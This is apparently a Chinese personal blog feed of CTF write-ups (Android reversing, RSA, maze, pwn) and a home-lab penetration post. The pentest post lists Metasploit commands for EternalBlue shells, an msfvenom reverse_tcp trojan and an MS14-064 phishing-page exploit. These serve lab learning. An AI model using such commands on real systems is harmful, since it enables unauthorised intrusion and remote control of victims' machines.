src="https://img-blog.csdnimg.cn/20210327100155781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一道简单的安卓逆向题就做完了！</p></blockquote><hr /><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><blockquote><p>发现mobile的题都有点难，一直做的逆向题，还是有点不适应mobile的类型题！<br>此时我们用jadx打开！<br><img src="https://img-blog.csdnimg.cn/20210327113111521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以找到该类！<br><img src="https://img-blog.csdnimg.cn/20210327161421875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时这个很熟悉！猜测是base64加密，所以我直接去base64解密一下，但很可惜的是并不是，解密的什么都不是，还出现了不可见字符！<br>所以~~~~~嗯嗯额！<br>这是个什么呢？<br>他是个native层调用！<br>此时我们就要将其后缀名改为zip格式就可以了，然后解压，找到libc文件夹里的文件进行ida分析！<br><img src="https://img-blog.csdnimg.cn/20210327162339318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们有换了个.so文件进行ida分析，找到了AES加密，其实是因为上一个分析中发现AES加密是在plt表中，所以我就又换了个文件进行查找！<br><img src="https://img-blog.csdnimg.cn/2021032716280634.png" alt="在这里插入图片描述"><br>然后在jadx中也可以找到原始数据！<br><img src="https://img-blog.csdnimg.cn/202103271629376.png" alt="在这里插入图片描述"><br>这个是瞎点的，我在这里是没有技术含量的，然后解密！<br><img src="https://img-blog.csdnimg.cn/2021032716325811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就出来了！</p></blockquote><p>其实这里说一下，最好是先在模拟器中运行一遍再说！因为我的这台机器是没有模拟器的，有点差！</p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1433795646&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小小的渗透实验</title>
      <link href="posts/f1e5d4c0/"/>
      <url>posts/f1e5d4c0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>目标机：192.168.5.132<br>攻击机：192.168.5.131</p><hr /><p>~1 启用msf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>~2 搜索ms17_010工具目录进行利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search smb_ms17_010</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319165956218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>~3 调用scanner smb_ms17_010模块进行扫描，并用show options查看设置参数.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319170130855.png" alt="在这里插入图片描述"></p><p>~4 设置一下攻击地址，run一下进行检测！<br>调用exploit下的ms17_010_eternalblue模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.5.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319170259209.png" alt="在这里插入图片描述"><br>~5 调用exploit下的ms17_010_eternalblue模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319170558415.png" alt="在这里插入图片描述"><br>~6 设置目标靶机，并用run 或者 exploit命令调用漏洞测试，最终成功拿下目标shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.5.132</span><br><span class="line">run</span><br><span class="line">? #可以查看命令帮助</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319170711928.png" alt="在这里插入图片描述"></p><p>此时便成功了！！！<br><img src="https://img-blog.csdnimg.cn/2021031917082036.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell #取得目标机的命令行</span><br></pre></td></tr></table></figure><h1 id="msf钓鱼"><a href="#msf钓鱼" class="headerlink" title="msf钓鱼"></a>msf钓鱼</h1><p>目标机：192.168.5.132<br>攻击机：192.168.5.131</p><hr />~1 <p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机地址 lport&#x3D;攻击机端口f exe &gt;&#x2F;root&#x2F;木马名.exe</span><br></pre></td></tr></table></figure><p>到这里其实就卡了，因为kail的木马移动到win10中会被删除掉的，并且这个是没有进行加密的。</p><p><img src="https://img-blog.csdnimg.cn/20210319171201655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="MS14-064钓鱼网站"><a href="#MS14-064钓鱼网站" class="headerlink" title="MS14_064钓鱼网站"></a>MS14_064钓鱼网站</h1><p>目标机：192.168.5.132<br>攻击机：192.168.5.131</p><hr />~1 <p>搜索该漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms14</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319171343389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>~2</p><p>使用攻击模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319171446787.png" alt="在这里插入图片描述"><br>~3</p><p>设置地址并将AllowPowershellPrompt设置成true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp #设置反弹shell</span><br><span class="line">set lhost 192.168.5.131  #设置本地IP</span><br><span class="line">set AllowPowershellPrompt true  #设置游览器插件</span><br><span class="line">run  #运行 同下</span><br><span class="line">exploit  #运行 同上</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319172227219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>~4</p><p><img src="https://img-blog.csdnimg.cn/20210317213749803.png" alt="在这里插入图片描述"><br>根据提示将url网站发给目标机！<br>目标机运行后利用sessions查看上钩的鱼！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319172922443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Windows远程桌面蓝屏漏洞利用-Metasploit-framework"><a href="#Windows远程桌面蓝屏漏洞利用-Metasploit-framework" class="headerlink" title="Windows远程桌面蓝屏漏洞利用(Metasploit-framework)"></a>Windows远程桌面蓝屏漏洞利用(Metasploit-framework)</h1><p>目标机：192.168.5.132<br>攻击机：192.168.5.131</p><hr /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nbtscan</span><br><span class="line">这是一款用于扫描Windows网络上NetBIOS名字信息的程序。</span><br><span class="line">该程序对给出范围内的每一个地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan列出它的IP地址、NetBIOS计算机名、登录用户名和MAC地址。</span><br></pre></td></tr></table></figure><p>在不知道攻击机的IP地址时，可以使用该命令进行查看！<br><img src="https://img-blog.csdnimg.cn/20210319111542529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后搜索ms12-020漏洞的模块！<br><img src="https://img-blog.csdnimg.cn/20210319112101463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用第一个模块！(第二个模块也是可以的)<img src="https://img-blog.csdnimg.cn/20210319112335248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们在使用第一个模块进行攻击！<br><img src="https://img-blog.csdnimg.cn/20210319112742240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里是失败的，并且在探测模块中进行探测是就已经探测到没有该漏洞！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1830423322&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SignIn &amp; easyRE1 &amp; easy_Maze</title>
      <link href="posts/14d09ebd/"/>
      <url>posts/14d09ebd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h1><p>是个ELF文件，先EP再ida打开它。<img src="https://img-blog.csdnimg.cn/20210314091627814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>main函数上来，就知道它大概是证明回事了！输入flag再进入sub_96A这个函数里面进行比较。<br>不过我们需要知道 <strong>__gmpz_init_set_str</strong> 这个函数是什么意思？就是将中间的参数以最后一个参数为进制储存到第一个参数。<br><strong>__gmpz_powm</strong> 这个函数就有点不好理解了，就是v5的几次方再对后一个参数取模。<br><strong>__gmpz_cmp</strong> 这个函数就是比较了。<br>这里用到了RSA算法，这里就不做过多的介绍，因为一时半会也介绍完！可以专门看看讲解RSA的博客！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C &#x3D; 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">N &#x3D; 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">E &#x3D; 65537</span><br></pre></td></tr></table></figure><p>使用yafu这个软件进行对N的分解，会出现个文档，去查看数据即可<br><img src="https://img-blog.csdnimg.cn/20210314094436393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P &#x3D; 282164587459512124844245113950593348271</span><br><span class="line">Q &#x3D; 366669102002966856876605669837014229419</span><br></pre></td></tr></table></figure><p>利用python里的gmpy2库进行计算。也可以用C的gmp库进行计算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 282164587459512124844245113950593348271</span><br><span class="line">q &#x3D; 366669102002966856876605669837014229419</span><br><span class="line">c &#x3D; 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">n &#x3D; 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">d &#x3D; gmpy2.invert(e,(p-1)*(q-1))</span><br></pre></td></tr></table></figure><hr /><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这里主要是考察RSA算法，题目本身的考点在这里。</p><h1 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h1><p>解压存在两个文件，一个32位，一个64位，此时我们就先EP探查一下，然后在用ida打开32位的进行逆向！<br>可以通过搜索字符串找到flag：<br><img src="https://img-blog.csdnimg.cn/20210319101746381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>难度有点低！<br>或者找到main函数(特别好找！)然后F5查看伪代码就可以了！<br><img src="https://img-blog.csdnimg.cn/20210319101913116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这道题很简单，不知道为什么出现在了这儿？</p><hr /><h1 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h1><p>先用EP探查，然后用ida打开，是个64位系统！<br>很轻松的可以看到里面的一些内容，是用C++写的，还是很简单的！<br>先分析一波主函数！<br><img src="https://img-blog.csdnimg.cn/20210319102450200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后进入Step_2这个函数里面分析一波！<br><img src="https://img-blog.csdnimg.cn/20210319102611293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里看起来是个地图，原来是个迷宫题目！<br>在主函数中里面刚开始定义的1和-1就是地图了！坐标6和9应该就是终点了(根据上图)<br><img src="https://img-blog.csdnimg.cn/20210319103434127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就差地图了，找到地图说明就找到了flag了！<br><img src="https://img-blog.csdnimg.cn/20210319104258369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>gdb动态调试！<br>此时写出地图就可以了(可以用个脚本写，也可以用手写个！花不了太多的时间！)<br><img src="https://img-blog.csdnimg.cn/20210319104616145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者gdb调试时直接打印出内存中的值！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</span><br></pre></td></tr></table></figure><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1433795646&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn的题又来了</title>
      <link href="posts/fb3d813f/"/>
      <url>posts/fb3d813f/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><p>是个压缩包，解压发现有两个文件，应该一个是程序，一个是动态连接库，一看就知道很难。EP上文件是没有加壳的，我们就直接区ida分析它。是个64位的文件。<br><img src="https://img-blog.csdnimg.cn/20210311185016845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里其实我们也已经有了大致的思路，不过先看看有什么保护措施吧！<br><img src="https://img-blog.csdnimg.cn/20210311185239279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我想的是直接栈溢出，修改eip值到flag函数的地址，不过看起来是不行的。因为buf读0x50单位，整好栈为50，没有再长的输入了，差了一点。不过seed在下面。<img src="https://img-blog.csdnimg.cn/20210311185753566.png" alt="在这里插入图片描述"><br>这样子动态链接库也有啦，此时思路讲一下，通过栈溢出修改seed的值，再根据它的链接库，生成我们本地的随机数，从而达到我们操控。这道题挺简单的(蛤！什么时候我也敢说大话了？)。<br><img src="https://img-blog.csdnimg.cn/20210311191107766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跑起来，运行flag就得到了。<br><img src="https://img-blog.csdnimg.cn/20210311191243149.png" alt="在这里插入图片描述"><br>这是我第一个独立不看wp并且速度最快的一次做pwn题。</p><hr /><h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><p>这道题直接一个附件，EP了一下，发现不是压缩包(以为它要坑我)所以直接ida分析一番。就只有一个输入的地方，且明显没有栈溢出的问题，不过下面通过一下判断是可以造成栈溢出的。先看一下保护措施。<br><img src="https://img-blog.csdnimg.cn/20210311192930207.png" alt="在这里插入图片描述"><br>这些保护措施可以绕过，不妨碍我们攻击。不过我的思路有了问题，此时我想的是通过输入v2对v14产生栈溢出，不过明显不可能，它最后有一条语句是要执行它的，此时我们修改它的地址入口到flag函数里面就可以了。<img src="https://img-blog.csdnimg.cn/20210311200708190.png" alt="在这里插入图片描述"><br>此时我们可以对其进行追踪，看看其再栈中的位置。不过再来对代码进行进一步的分析。<br><img src="https://img-blog.csdnimg.cn/20210311201036999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>大致思路就是这个样子了。<br><img src="https://img-blog.csdnimg.cn/20210311201614604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明几点，为什么是A，A的Ascll码值为65，是可以跳过case 1:中的判断的。这样子运行跑起来就可以了。<br><img src="https://img-blog.csdnimg.cn/2021031120205830.png" alt="在这里插入图片描述"><br>没有什么好说的。这里还有一种方法，就是直接溢出将v3后面的地址全都修改成system入口地址。</p><hr /><h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>还是个elf文件，不做过多介绍，直接进入ida打开进行分析。<br><img src="https://img-blog.csdnimg.cn/20210311203041730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>虽说它告诉我们有两个bug，但是我们还需要查看保护措施。<img src="https://img-blog.csdnimg.cn/20210311203243319.png" alt="在这里插入图片描述"><br>NX保护有，金丝雀保护也有。<img src="https://img-blog.csdnimg.cn/20210311203918161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过还有一个格式化字符串漏洞，它是为了信息泄露提醒我们Canary的地址。<img src="https://img-blog.csdnimg.cn/2021031120514340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先我们要用格式化字符串漏洞进行信息泄露，然后用栈溢出漏洞进行溢出攻击。v2中存放的是Canary值，利用格式化字符串漏洞泄露主它的值，这样就再进行栈溢出就不会报错了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式控制符“%p”中的p是pointer（指针）的缩写。指针的值是语言实现（编译程序）相关的，但几乎所有实现中，指针的值都是一个表示地址空间中某个存储器单元的整数。printf函数族中对于%p一般以十六进制整数方式输出指针的值，附加前缀0x。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210311210844442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>偏移量为6，而buf和Canary差0x90-0x8位数，故输入应为%(6+(0x90-0x8)/0x8)$p这个东西的。<img src="https://img-blog.csdnimg.cn/20210311211857729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跑起来运行起来它flag就有了。<br><img src="https://img-blog.csdnimg.cn/20210311212005804.png" alt="在这里插入图片描述"><br>很不容易做出来了。</p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1475737616&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快乐带着pwn题来啦</title>
      <link href="posts/60e199a7/"/>
      <url>posts/60e199a7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><p>这道题先看看附件，探查一下信息，再用ida打开，就可以发现伪代码其实很简单的：<br><img src="https://img-blog.csdnimg.cn/2021010409122779.png" alt="在这里插入图片描述"><br>然后在远程连接这个端口进行攻击了。<br>并且我们能看到它的大致防护信息，然后来个脚本：<br><img src="https://img-blog.csdnimg.cn/20210104092358173.png" alt="在这里插入图片描述"><br>此时就可以进行攻击了。<br><img src="https://img-blog.csdnimg.cn/20210104094227205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就拿到了。</p><hr /><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>刚开始先在windows里进行一番静态调试：<br><img src="https://img-blog.csdnimg.cn/20210104101630556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>大概的知道了一些漏洞，和一点信息，我们就可以进行破解了。<br>此时我们要了解一下格式化字符串漏洞，和PIE保护。<br>==PIE== 全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址<br>==格式化字符串漏洞== 漏洞产生的原理就是程序员偷懒将格式化字符串的操作权交给了用户，然后就会产生任意地址读写的漏洞，我们就可以利用%x将对应的内存地址泄露出来，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 